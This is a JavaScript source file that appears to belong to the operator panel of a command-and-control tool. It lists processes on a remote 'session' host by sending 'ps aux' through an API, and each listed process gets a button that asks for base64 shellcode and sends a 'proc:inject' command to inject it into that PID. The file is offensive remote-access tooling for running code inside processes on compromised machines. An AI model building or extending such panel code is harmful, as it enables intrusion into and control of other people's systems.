// panel/js/procview.js — Process list viewer
window.ProcView = {
    async load(sessionId) {
        const url = window.Auth.url.replace(/\/$/, '');
        const modal = document.getElementById('proc-modal');
        const tbody = document.getElementById('proc-tbody');
        const title = document.getElementById('proc-title');
        if(!modal || !tbody) return;

        modal.classList.remove('hidden');
        title.textContent = `Processes — Session #${sessionId}`;
        tbody.innerHTML = '<tr><td colspan="3" class="p-3 text-center text-gray-500">Loading...</td></tr>';

        try {
            // Send the internal_procs command (or shell equivalent)
            const res = await fetch(`${url}/api/hosts/${sessionId}/command`, {
                method: 'POST',
                headers: { 'X-API-KEY': window.Auth.key, 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: 'ps aux' })
            });
            if(!res.ok) { tbody.innerHTML = '<tr><td colspan="3" class="p-3 text-red-400">Failed to send command</td></tr>'; return; }
            const data = await res.json();

            // Poll for result
            for(let i = 0; i < 20; i++) {
                await new Promise(r => setTimeout(r, 500));
                const out = await fetch(`${url}/api/hosts/${sessionId}/output/${data.request_id}`, {
                    headers: { 'X-API-KEY': window.Auth.key }
                });
                if(!out.ok) continue;
                const result = await out.json();
                if(result.status === 'completed' && result.output) {
                    this.renderProcesses(tbody, result.output);
                    return;
                }
            }
            tbody.innerHTML = '<tr><td colspan="3" class="p-3 text-yellow-400">Timeout waiting for response</td></tr>';
        } catch(e) {
            tbody.innerHTML = `<tr><td colspan="3" class="p-3 text-red-400">Error: ${e.message}</td></tr>`;
        }
    },

    renderProcesses(tbody, output) {
        // Parse PID|Name format from the agent's process list
        const lines = output.trim().split('\n').filter(l => l.trim());
        if(lines.length === 0) {
            tbody.innerHTML = '<tr><td colspan="3" class="p-3 text-gray-500">No processes returned</td></tr>';
            return;
        }

        // Try PID|Name format first (agent native)
        const procs = [];
        for(const line of lines) {
            if(line.includes('|')) {
                const [pid, name] = line.split('|', 2);
                procs.push({ pid: pid.trim(), name: name?.trim() || '?' });
            } else {
                // Fallback: raw text line
                procs.push({ pid: '—', name: line.trim() });
            }
        }

        // Sort by PID numerically
        procs.sort((a, b) => (parseInt(a.pid) || 0) - (parseInt(b.pid) || 0));

        tbody.innerHTML = procs.map((p, i) => `
            <tr class="border-b border-gray-700/50 hover:bg-gray-800/50 ${i % 2 === 0 ? '' : 'bg-gray-800/20'}">
                <td class="px-3 py-1 font-mono text-xs text-gray-500">${escHtml(p.pid)}</td>
                <td class="px-3 py-1 text-sm text-gray-200">${escHtml(p.name)}</td>
                <td class="px-3 py-1 text-right">
                    <button onclick="ProcView.inject(${parseInt(p.pid) || 0})" class="text-xs text-gray-500 hover:text-red-400" title="Inject into this PID">
                        <i class="fas fa-syringe"></i>
                    </button>
                </td>
            </tr>
        `).join('');
    },

    inject(pid) {
        if(!pid) return;
        const sc = prompt(`Base64 shellcode to inject into PID ${pid}:`);
        if(!sc) return;
        const sessionId = document.getElementById('proc-title')?.textContent?.match(/#(\d+)/)?.[1];
        if(!sessionId) return;
        window.Terminal.open(parseInt(sessionId), `Session #${sessionId}`);
        setTimeout(() => window.Terminal.sendCommand(`proc:inject ${pid} ${sc}`), 500);
    },

    close() {
        document.getElementById('proc-modal')?.classList.add('hidden');
    }
};
